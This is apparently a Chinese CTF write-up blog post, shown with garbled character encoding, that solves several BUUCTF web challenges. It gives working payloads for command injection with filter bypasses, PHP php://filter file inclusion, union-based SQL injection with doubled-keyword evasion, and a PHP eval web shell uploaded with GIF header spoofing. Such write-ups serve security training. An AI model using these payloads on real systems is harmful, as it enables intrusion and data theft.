<p>è®©æˆ‘ä»¬getä¼ å…¥ä¸€ä¸ªIP<br><img src="https://img-blog.csdnimg.cn/569938c8fcdb447886240ed7bbfec003.png" alt="1"><br>é‚£ä¼ ä¸€ä¸ªIPåœ°å€çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š<br><img src="https://img-blog.csdnimg.cn/983781f716ab4dd0aa80bfe544eba0ce.png" alt="2"><br>åé¢æ‹¼æ¥ä¸€ä¸ªçœ‹çœ‹ï¼š<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;ls</code><br><img src="https://img-blog.csdnimg.cn/d5cf920fe0bf4f6ea4a7cc2fec2ce939.png" alt="3"><br>ä¸é”™æ¬¸ï¼Œç»§ç»­<code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat flag.php</code><br><img src="https://img-blog.csdnimg.cn/560f292fac52458eb954a92f641c625b.png" alt="4"><br>è¿‡æ»¤äº†ç©ºæ ¼ã€‚ç©ºæ ¼çš„ä»£æ›¿æœ‰<code>$IFSï¼Œ$&#123;IFS&#125;ï¼Œ$IFS$9ï¼Œ&lt;ï¼Œ&lt;&gt;ï¼Œ%09ï¼Œ%0a</code>ç­‰ï¼Œæœ€å<code>$IFS$9</code>èƒ½ç”¨ã€‚<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$9flag.php</code><br>flagåˆè¢«è¿‡æ»¤äº†<br><img src="https://img-blog.csdnimg.cn/6b6bd7f364e64dc1add617a96fb8be44.png" alt="5"><br>åˆ°åº•éƒ½æ˜¯è¿‡æ»¤äº†ä»€ä¹ˆï¼Ÿåˆ°index.phpçœ‹çœ‹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes
<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"

"</span><span class="token punctuation">;</span>
  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">?</span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤çš„ä¸å°‘å•Šï¼<strong>ä¼ªåè®®ï¼Œè½¬ä¹‰å­—ç¬¦</strong>éƒ½ä¸èƒ½ç”¨äº†ç”¨å­—ç¬¦æ›¿æ¢è¯•è¯•å§<br><code>http://03c1c197-5f25-4c94-b5a0-eb8e1d08e92f.node4.buuoj.cn:81/?ip=127.0.0.1;b=ag;cat$IFS$9fl$b.php</code><br>æŸ¥çœ‹æºç å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/6886b988df1241488482cddd05b97ae6.png" alt="6"><br><strong>æ–¹æ³•äºŒ</strong><br>åº”è¯¥å¯ä»¥å°†å‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œå†ç”¨base64-då‘½ä»¤æ¥æ‰§è¡Œï¼Œå¯ä»¥ç”¨shæ¥æ‰§è¡Œ<br><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code> å¾—åˆ°flag<br><strong>æ–¹æ³•ä¸‰</strong><br>å¸ˆå‚…ä»¬æœ‰çš„ç”¨å†…è”æ‰§è¡Œ</p>
<p>æ‰€è°“å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</p>
<blockquote>
<p>?ip&#x3D;127.0.0.1;cat$IFS$9`ls`<br>$IFSåœ¨Linuxä¸‹è¡¨ç¤ºä¸ºç©ºæ ¼<br>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹ç¬¬ä¹ä¸ªå‚æ•°æŒæœ‰è€…ï¼Œå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼Œ$åå¯ä»¥æ¥ä»»æ„æ•°å­—<br>ç”±äºlså¾—å‡ºæ¥flag.phpï¼Œindex.phpã€‚è¿™æ˜¯ä¼šcatå‡ºflag.phpå’Œindex.php</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d5db8ab9fb004a519fbbe440e4f633db.png" alt="7"><br>æˆ‘è®¤ä¸ºè¿™ç¯‡æ–‡ç« ä¸é”™ï¼Œå¤§å®¶å¯ä»¥<a href="https://blog.csdn.net/vanarrow/article/details/108295481#:~:text=%E5%86%85%E8%81%94%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B0%86%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%86%85%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%89%A7%E8%A1%8C%20%3Fip%3D127.0.0.1%3Bcat%24IFS%249%60ls%60%20%24IFS%E5%9C%A8Linux%E4%B8%8B%E8%A1%A8%E7%A4%BA%E4%B8%BA%E7%A9%BA%E6%A0%BC,%249%E6%98%AF%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9Fshell%E8%BF%9B%E7%A8%8B%E7%AC%AC%E4%B9%9D%E4%B8%AA%E5%8F%82%E6%95%B0%E6%8C%81%E6%9C%89%E8%80%85%EF%BC%8C%E5%A7%8B%E7%BB%88%E4%B8%BA%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%24%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%8E%A5%E4%BB%BB%E6%84%8F%E6%95%B0%E5%AD%97%20%E8%BF%99%E9%87%8C%24IFS%249%E6%88%96%24IFS%E5%9E%82%E7%9B%B4%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%8A%A0%E4%B8%AA%24%E4%B8%8E%7B%7D%E7%B1%BB%E4%BC%BC%EF%BC%8C%E8%B5%B7%E6%88%AA%E6%96%AD%E4%BD%9C%E7%94%A8%201">å‚è€ƒä¸€ä¸‹</a></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File 1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File 1</h2><p><img src="https://img-blog.csdnimg.cn/21b672b9a2514523b89df8ad798a406b.png" alt="1"><br>å»æºç çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/fb593331da744aa3930c6d89aeab2be7.png" alt="2"><br>æœ‰ä¸€ä¸ªphpæ–‡ä»¶,è®¿é—®ä¸€ä¸‹çœ‹çœ‹<code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/Archive_room.php</code><br><img src="https://img-blog.csdnimg.cn/9d9847ef896e4a73a697ff0f032e8477.png" alt="2"><br>ç‚¹å¼€å<br><img src="https://img-blog.csdnimg.cn/f6d7e63800e843c5a194471e7b29604e.png" alt="3"><br>é¡µé¢è·³è½¬å¤ªå¿«äº†ï¼ŒæŠ“åŒ…çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/f09067820c274538b236cad427d872b6.png" alt="5"></p>
<p>æ³¨é‡ŠåŒºæœ‰ä¸€ä¸ªæ–‡ä»¶è®¿é—®çœ‹çœ‹<br>å¾—åˆ°å¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() å‡½æ•°</a><br><a href="https://www.w3school.com.cn/php/func_string_strstr.asp">PHP strstr() å‡½æ•°</a><br>strstrå’Œstristréƒ½æ˜¯åŒ¹é…å­—ç¬¦ä¸²ç”¨çš„ï¼Œä½†æ˜¯strstræ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œstristræ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚</p>
<p>æ‰€ä»¥ä¾‹å¦‚ï¼š<br><code>&lt;?php  show_source(__FILE__);  echo $_GET[&#39;hello&#39;];  $page=$_GET[&#39;page&#39;];  while (strstr($page, &quot;php://&quot;)) &#123;  $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);   &#125;    include($page);    ?&gt;</code></p>
<blockquote>
<p>è¿™æ®µphpä»£ç ï¼Œå½“pageå‚æ•°ä¸­æœ‰php:&#x2F;&#x2F;å­—æ®µçš„æ—¶å€™å°±ä¼šè¢«æ›¿æ¢æˆç©ºï¼Œä½†æ˜¯æ˜¯ç”¨strstråŒ¹é…çš„ï¼Œæ‰€ä»¥å†™PHP:&#x2F;&#x2F;inputå†postå°±ä¸ä¼šè¢«æ›¿æ¢æ‰ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆå°±é‡‡ç”¨php:&#x2F;&#x2F;åè®®ä¸­çš„php:&#x2F;&#x2F;filter<br><code>http://cd07cfe1-455f-47ff-bded-782f66105f3d.node4.buuoj.cn:81/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code><br>å¾—åˆ°</p>
<blockquote>
<p>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNlZDgxOGYtZjM4MS00OWFjLThjNDEtOTMzOTE2ZmVjZGJjfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;<br>è§£å¯†ä¹‹åå¾—åˆ°flagã€‚</p>
</blockquote>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/ac670dfd41f2450a8d5ca02b5e9d3dc9.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/404c661805b048e39d33a2094a1ca0c7.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8bd81110c54a4d93b1977ffb225654d3.png" alt="3">ç›´æ¥ä¸‡èƒ½å¯†ç <br><img src="https://img-blog.csdnimg.cn/d90fecebb74646dcbf7f0067f51afab6.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/f766ec5a93624dcaa587c5b8b7572887.png" alt="5"><br>å¯†ç md5è§£å¯†ä¸è§£å¯†éƒ½ä¸èƒ½ç”¨ï¼Œé¢˜ç›®æ—¢ç„¶æ˜¯LoveSQLï¼Œé‚£å°±å¼€å§‹æœ€åŸºç¡€çš„æ“ä½œ<br>æŸ¥çœ‹æœ‰å‡ åˆ—<code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 4%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/aa0456adb9c04bb49d67511f09994f1d.png" alt="5"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/8a28e495e33e4fe3957bbdb7906bcf14.png" alt="6"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,2,3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/760edddc69cb4cb2b42c44d75e69b35b.png" alt="7"><br>åœ¨2å’Œ3ä½ç½®æ³¨å…¥<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,database(),3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/153c23c6528f42e3a70789972ce64e9a.png" alt="8"><br><strong>çˆ†ç ´è¡¨åï¼š</strong><br> <code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/70b3fb676e0b4563b3f2bd70506e1390.png" alt="9"><br><strong>geekuser</strong>å’Œ<strong>l0ve1ysq1</strong>ï¼Œå…ˆçœ‹ç¬¬ä¸€ä¸ªï¼Œ<br><strong>çˆ†ç ´åˆ—åï¼š</strong><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;geekuser&#39;%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/c4f226dea1934756b7a81508108a96f4.png" alt="10"><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM geekuser%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/3cb3400a84e147568c891de1ffeddd5a.png" alt="11">ä¸å¯¹ï¼Œçœ‹å¦ä¸€ä¸ªè¡¨<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM l0ve1ysq1%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/953a9aa4e16446e8b2013e713a20350b.png" alt="12"></p>
<p>å¾—åˆ°flagã€‚</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>å°±æ˜¯ä¸€ä¸ªé¡µé¢ï¼Œçœ‹äº†ä¸€éæ²¡å•¥ï¼Œçœ‹çœ‹æºç ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>æœ‰secret.phpæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2">éœ€è¦ä¼ªé€ ï¼Œå¼€å§‹æŠ“åŒ…æ”¹åŒ…</p>
<p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç»§ç»­æ”¹<br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br>æœ¬åœ°ä»£ç†å¼€å¯<br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p><strong>æ–‡ä»¶ä¸Šä¼ </strong><br><img src="https://img-blog.csdnimg.cn/bcaa47b202f84691a8025030c81de3e1.png" alt="1"><br>ä¸€å¥è¯æœ¨é©¬å®‰æ’ä¸Šï¼<code>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[111])&lt;/script&gt;</code>æˆ–<code>&lt;?php eval$_POST[111];?&gt;</code>æœ¬é¢˜ä¸­ç¬¬äºŒä¸ªä¸è¡Œï¼Œé€‰ç¬¬ä¸€ä¸ªã€‚ä»–è®©ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œé‚£æˆ‘ä»¬å°±åœ¨æŠ“åŒ…çš„æ—¶å€™æ”¹ä¸€ä¸‹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/943f2c97506b44f2a89f2411ca82ea8b.png" alt="3"><br>ç»“æœæ²¡æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/1d35bc7aa0804e2c8d483798fe1681c5.png" alt="2"><br>åœ¨ä¸€å¥è¯æœ¨é©¬å†…å®¹å‰é¢åŠ å…¥<strong>gif89a</strong>ï¼Œå¦‚ï¼šgif89a &lt;%eval request(â€œxxâ€)%&gt; ç„¶åå°†æœ¨é©¬ä¿å­˜ä¸ºå›¾ç‰‡çš„æ ¼å¼ï¼Œå¦‚xxx.jpgï¼Œxx.gifæ–‡ä»¶å¤´æ¬ºéª—å¯ä»¥ç”¨æ¥ç»•è¿‡ç®€å•çš„wafã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯GIF89a?</strong></p>
<blockquote>
<p>ä¸€ä¸ªGIF89aå›¾å½¢æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ ¹æ®å›¾å½¢äº¤æ¢æ ¼å¼ï¼ˆGIFï¼‰89aç‰ˆï¼ˆ1989å¹´7 æœˆå‘è¡Œï¼‰è¿›è¡Œæ ¼å¼åŒ–ä¹‹åçš„å›¾å½¢ã€‚åœ¨GIF89aä¹‹å‰è¿˜æœ‰87aç‰ˆï¼ˆ1987å¹´5æœˆå‘è¡Œï¼‰ï¼Œä½†åœ¨Webä¸Šæ‰€è§åˆ°çš„å¤§å¤šæ•°å›¾å½¢éƒ½æ˜¯ä»¥89aç‰ˆçš„æ ¼å¼åˆ›å»ºçš„ã€‚ 89aç‰ˆçš„ä¸€ä¸ªæœ€ä¸»è¦çš„ä¼˜åŠ¿å°±æ˜¯å¯ä»¥åˆ›å»ºåŠ¨æ€å›¾åƒï¼Œä¾‹å¦‚åˆ›å»ºä¸€ä¸ªæ—‹è½¬çš„å›¾æ ‡ã€ç”¨ä¸€åªæ‰‹æŒ¥åŠ¨çš„æ——å¸œæˆ–æ˜¯å˜å¤§çš„å­—æ¯ã€‚ç‰¹åˆ«å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸€ä¸ªåŠ¨æ€GIFæ˜¯ä¸€ä¸ª ä»¥GIF89aæ ¼å¼å­˜å‚¨çš„æ–‡ä»¶ï¼Œåœ¨ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶é‡ŒåŒ…å«çš„æ˜¯ä¸€ç»„ä»¥æŒ‡å®šé¡ºåºå‘ˆç°çš„å›¾ç‰‡ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/77420aae89a84bcf8f5f4b088d5a2939.png" alt="5"><br>è¿˜æ˜¯ä¸è¡Œ<br>åæ¥å‘ç°æ˜¯å†™æˆshell.phtmlå¯ä»¥ï¼Œ<img src="https://img-blog.csdnimg.cn/eae751b2d53548b4a0a8e06cd5532007.png" alt="6"><br>èšå‰‘è¿æ¥å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/f2813def245f434e82b4e1bf716bab2a.png" alt="7"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p><img src="https://img-blog.csdnimg.cn/7c30418f57b942f6b50b6cd9438386cd.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/d1cfa48ceafa4f56b8d51e4c4c218199.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/97419c713baf4031b1bee85bcb3d2c48.png" alt="3"><br>å¯èƒ½æ˜¯orè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åŒå†™ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/d6d8052077c14610b0e4be63ff5b83f7.png" alt="4"><br>æˆåŠŸï¼<br><img src="https://img-blog.csdnimg.cn/16958e2ab1af45e1ac30c433bef723af.png" alt="5"><br>ç»è¿‡æµ‹è¯•ï¼Œor,by,union,select,where,from,andéƒ½è¢«è¿‡æ»¤äº†ï¼Œé‚£å°±éƒ½è¿›è¡ŒåŒå†™ç»•è¿‡<br>çˆ†å‡ºæœ‰å“ªäº›ä½ç½®å¯ä»¥è¿›è¡Œè¾“å‡ºæ•°æ®<br><code>1&#39; oorrder by 3#</code><br><em>ç»æµ‹è¯•æœ‰3åˆ—</em></p>
<p>æŸ¥çœ‹æ•°æ®åº“åå­—<br><code>1&#39; uunionnion selselectect 1,2,database()#</code></p>
<p>çˆ†ç ´è¡¨åï¼š<br><code>-1&#39; uunionnion seselectlect 1,2,group_concat(table_name) FFROMROM infoorrmation_schema.tables wherwheree table_schema=database()#</code><br><img src="https://img-blog.csdnimg.cn/d4a24a5c9e66422eaee2a7d97cc3e5ab.png" alt="6"></p>
<p>çˆ†ç ´åˆ—åï¼š<br><code>1&#39; ununionion seselectlect 1,2,group_concat(column_name) FRFROMOM infoorrmation_schema.columns whewherere table_schema=database() and table_name=&#39;è¡¨å&#39;#</code><br><img src="https://img-blog.csdnimg.cn/489436bf5b2c4bed8b6d663e4c2fc9b3.png" alt="7"></p>
<p>çˆ†ç ´æ•°æ®ï¼š<br><code>1&#39; uniunionon seleselectct 1,2,group_concat(id,username,passwoorrd) FFROMROM è¡¨å#</code><br>å¾—åˆ°flag.<br><img src="https://img-blog.csdnimg.cn/0d1f40d27af84b55a5307d37c9174e27.png" alt="8"></p>
<h3 id="æ€»ç»“ä¸€ä¸‹"><a href="#æ€»ç»“ä¸€ä¸‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹"></a>æ€»ç»“ä¸€ä¸‹</h3><p>æœ¬é¢˜éš¾åº¦ä¸å¤§ï¼Œä¸»è¦è¿›è¡ŒåŒå†™ç»•è¿‡ï¼Œå…¶ä¸­oråœ¨è¢«è¿‡æ»¤æ—¶è¦æ³¨æ„<strong>information</strong>ä¸­çš„<strong>or</strong>ä¹Ÿä¼šè¿‡æ»¤ï¼Œæ‰€ä»¥è¦å†™æˆ<strong>infoorrmation</strong></p>
